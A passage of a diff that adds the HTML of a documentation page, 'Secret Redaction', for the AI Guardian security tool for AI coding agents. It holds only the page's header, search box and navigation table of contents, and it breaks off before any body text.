@@ -1,0 +1,4179 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Security guardrails for AI coding agents and IDE integrations">
+      
+      
+      
+        <link rel="canonical" href="https://ai-guardian.readthedocs.io/security/SECRET_REDACTION/">
+      
+      
+        <link rel="prev" href="../SECRET_SCANNING/">
+      
+      
+        <link rel="next" href="../PROMPT_INJECTION/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Secret Redaction - AI Guardian</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/_mkdocstrings.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#secret-redaction" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="AI Guardian" class="md-header__button md-logo" aria-label="AI Guardian" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            AI Guardian
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Secret Redaction
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/RedHatProductSecurity/ai-guardian" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    RedHatProductSecurity/ai-guardian
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="AI Guardian" class="md-nav__button md-logo" aria-label="AI Guardian" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    AI Guardian
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/RedHatProductSecurity/ai-guardian" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    RedHatProductSecurity/ai-guardian
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../.." class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Getting Started
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../documentation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Documentation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../DEVELOPER_GUIDE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Developer Install
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CONFIGURATION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../COOKBOOK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuration Cookbook
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SCANNER_INSTALLATION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Scanner Installation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TROUBLESHOOTING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Troubleshooting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Features
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Security Features
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SECRET_SCANNING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Secret Scanning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Secret Redaction
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Secret Redaction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-it-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How It Works
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="How It Works">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#redaction-pipeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Redaction Pipeline
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#masking-strategies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Masking Strategies
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Masking Strategies">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-preserve-prefixsuffix" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Preserve Prefix/Suffix
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-full-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Full Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-environment-variable-assignment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Environment Variable Assignment
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-json-field-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. JSON Field Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-http-header-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. HTTP Header Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-connection-string-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Connection String Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-context-aware-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Context-Aware Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#supported-secret-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Supported Secret Types
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Supported Secret Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#api-keys-tokens-18-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        API Keys &amp; Tokens (18 types)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cloud-credentials-4-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cloud Credentials (4 types)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#database-credentials-4-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Database Credentials (4 types)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#private-keys-1-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Private Keys (1 type)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generic-patterns-8-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Generic Patterns (8 types)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Configuration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration Options
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#action-modes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Action Modes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adding-custom-patterns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding Custom Patterns
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pattern-server-integration-enterprise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pattern Server Integration (Enterprise)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#usage-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Usage Examples
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Usage Examples">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#example-1-api-key-in-command-output" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 1: API Key in Command Output
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-2-environment-variables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 2: Environment Variables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-3-database-connection-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 3: Database Connection String
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-4-http-request-with-bearer-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 4: HTTP Request with Bearer Token
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-5-private-key" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 5: Private Key
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#redaction-metadata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Redaction Metadata
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Redaction Metadata">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#metadata-fields" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Metadata Fields
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#performance-impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Performance Impact
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#security-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Security Considerations
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Security Considerations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-secret-redaction-protects-against" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What Secret Redaction Protects Against
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-it-does-not-protect-against" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What It Does NOT Protect Against
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-in-depth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense in Depth
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Best Practices
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Best Practices">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#for-developers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Developers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for-security-teams" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Security Teams
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for-compliance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Compliance
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Troubleshooting
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Troubleshooting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#secrets-not-being-redacted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Secrets Not Being Redacted
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#too-many-false-positives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Too Many False Positives
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#performance-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Performance Issues
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technical-details" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Technical Details
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Technical Details">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#regex-pattern-validation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Regex Pattern Validation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pattern-priority" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pattern Priority
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#string-replacement-algorithm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        String Replacement Algorithm
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#see-also" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        See Also
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#version-history" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Version History
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PROMPT_INJECTION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prompt Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CONTEXT_POISONING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Context Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF_PROTECTION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IMAGE_SCANNING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PII and Image Scanning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CREDENTIAL_EXFILTRATION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Exfiltration
+  
